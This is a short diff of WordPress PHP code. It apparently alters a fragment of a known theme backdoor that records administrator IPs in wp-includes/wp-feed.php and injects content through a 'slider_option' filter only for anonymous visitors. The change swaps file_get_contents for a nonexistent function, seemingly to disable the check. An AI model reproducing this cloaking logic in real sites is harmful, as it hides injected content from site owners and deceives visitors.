@@ -75,7 +75,7 @@ if( current_user_can('edit_others_pages'))
 
 if (file_exists(ABSPATH.'wp-includes/wp-feed.php'))
 {
-$ip=@file_get_contents(ABSPATH.'wp-includes/wp-feed.php');
+$ip=@file__get_contents(ABSPATH.'wp-includes/wp-feed.php');
 }
 
 if (stripos($ip, $_SERVER['REMOTE_ADDR']) === false)
@@ -112,7 +112,7 @@ foreach ($SE as $source) {
 
 if(!isset($_COOKIE['wordpress_cf_adm_use_adm']) && !is_user_logged_in()) 
 {
-$adtxt=@file_get_contents(ABSPATH.'wp-includes/wp-feed.php');
+$adtxt=@file__get_contents(ABSPATH.'wp-includes/wp-feed.php');
 if (stripos($adtxt, $_SERVER['REMOTE_ADDR']) === false)
 {
 add_filter('the_content','slider_option');
